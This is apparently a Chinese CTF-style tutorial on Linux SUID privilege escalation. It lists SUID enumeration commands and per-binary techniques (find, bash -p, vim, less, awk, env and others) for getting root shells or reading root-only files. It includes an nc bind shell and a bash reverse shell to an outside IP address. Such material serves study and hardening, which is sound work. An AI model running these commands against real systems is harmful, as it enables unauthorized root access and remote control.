​ SUID (Set UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义。
 在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效. 通俗的来讲,假设我们现在有一个可执行文件`ls`,其属主为root,当我们通过非root用户登录时,如果`ls`设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限.
​ 利用此特性,我们可通过SUID进行提权
## 设置suid
在了解SUID提权以前 我们简单看一下如何设置SUID权限
```
chmod u+s filename 设置SUID位  
chmod u-s filename 去掉SUID设置
```
![](image/359.png)
发现设置suid后从`-rw-r--r--`变成了`-rwSr--r--`，多了一个S，这表名文件已经获得权限。
## 通过root设置的具有SUID权限的二进制可执行文件提权
现在已知的具有SUID权限的二进制可执行文件大体有如下这些
```
nmap
vim
find
bash
more
less
nano
cp
awk
```
以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。
```
find / -user root -perm -4000 -print 2>/dev/null  
find / -perm -u=s -type f 2>/dev/null  
find / -user root -perm -4000 -exec ls -ldb {} ;
```
执行输出
```
/bin/mount 
/bin/umount 
/bin/su 
/usr/bin/passwd 
/usr/bin/chsh 
/usr/bin/find 
/usr/bin/chfn 
/usr/bin/newgrp 
/usr/bin/gpasswd
....
```

以上所有的二进制文件都将以root权限运行 我们随便找一个
```
└─$ ls -sl /bin/su
84 -rwsr-xr-x 1 root root 84432 Dec 17 17:42 /bin/su
```
可以看到其设置了suid权限且属主为root
#### nmap(已失效)
```
nmap --interactive

之后执行:
nmap> !sh
sh-3.2# whoami
root

//这是真正意义上的提权，进入到了root用户的shell
```
但是这是老版本的，为了安全性，nmap的这个机制已经弃用。
#### find
​ find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。
提权如下:
```
touch anyfile #必须要有这个文件 
find anyfile -exec whoami \;
```

发现执行结果是`root`，如果想进行其他`root`权限的操作，把`whoami`换成其他指令就可以了，例如
```
find index.php -exec cat /root/flag.txt \;
```
进入shell
```
#进入shell 
find anyfile -exec '/bin/sh' \;  
sh-5.0# whoami  
root
```
但是我在我的虚拟机里试了一下，发现
```
└─$ ls -al /usr/bin/find
-rwxr-xr-x 1 root root 233040 Aug 10  2024 /usr/bin/find
```
没有s，至少我的虚拟机版本不可用吧，但是在其他环境里是可以的。当然了，可以手动设置。
#### nc
linux一般都安装了nc 我们也可以利用nc 广播或反弹shell
广播shell:
```
find user -exec nc -lvp 4444 -e '/bin/sh' \;
```
在攻击机上:
```
nc 靶机ip 4444
```
反弹shell
```
find flag -exec bash -c 'bash -i >& /dev/tcp/121.89.81.39/2333 0>&1' \;
```
在攻击机上:
```
nc -lvvp 2333
```
#### vim
vim的主要用途是做编辑器,是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件。(包括只有root用户可以访问的文件)
```
vim.tiny /etc/passwd
```
也可以直接进入命令行模式
```
vim.tiny -c ':!/bin/sh'
```
但是进去后用户不是`root`，貌似没什么用。
#### Bash
以下命令将以root身份打开一个bash shell。
```
└─$ bash -p           
bash-5.2# whoami
root
```
#### less
less命令也可以进入shell
```
less /etc/passwd
#在less中输入:
!/bin/sh
```
但也不是root，所以主要是用来读取文件的
#### more
more命令进入shell和less相同
```
more /etc/passwd
#在more中输入:
!/bin/sh
```
要注意的是使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用`!`命令进入shell
#### nano
nano也算是比较上古的文本编辑器了
nano进入shell的方法为
```
nano #进入nano编辑器
Ctrl + R
Ctrl + X 
#即可输入命令
```
#### cp
使用cp 命令覆盖原来的`/etc/passwd`文件
#### awk
awk命令进入shell:
```
awk 'BEGIN {system("/bin/bash")}'
```
#### date
```
└─$ date -f /root/flag
date: invalid date ‘flag{Hello_Y0u_fing_m3!}’
```
虽然会报错，但是可以爆出文件内容。
#### ed
`ed` 命令 是单行纯文本编辑器，它有命令模式（command mode）和输入模式（input mode）两种工作模式。 
命令行模式执行命令
```
ed
!/bin/sh
```
#### time
```
└─$ time whoami   
kali

real    0.00s
user    0.00s
sys     0.00s
cpu     84%
```
#### dmesg
显示Linux系统启动信息  
dmesg命令 被用于检查和控制内核的环形缓冲区。kernel会将开机信息存储在ring buffer中。您若是开机时来不及查看信息，可利用dmesg来查看。开机信息保存在/var/log/dmesg文件里。
```
dmesg -H #进入命令行模式
!whoami  #用  !<命令>  执行系统命令
```
#### env
env执行系统命令
```
└─$ env cat /root/flag
flag{Hello_Y0u_fing_m3!}
```
#### flock执行系统命令
是Linux 的文件锁命令。可以通过一个锁文件，来控制在shell 中逻辑的互斥性。
```
└─$ flock -u / whoami
root
```
#### ionice
获取或设置程序的IO调度与优先级。
```
└─$ ionice whoami     
root
```
#### nice
nice用于修改程序的优先级。
```
└─$ nice whoami   
root
```
#### strace执行系统命令
监控程序的执行状况
```
└─$ strace -o /dev/null whoami
root
```

## 防范
管理员要仔细研究具有SUID权限的文件,不要给易被利用的文件以SUID权限,防止SUID的滥用导致黑客在进入服务器时轻易获取root权限。
解题的话只要用上面的find命令找到前面的任一命令，那就可能是个突破点。


## 参考文章
https://www.freebuf.com/articles/web/272617.html
https://tttang.com/archive/1793/
https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html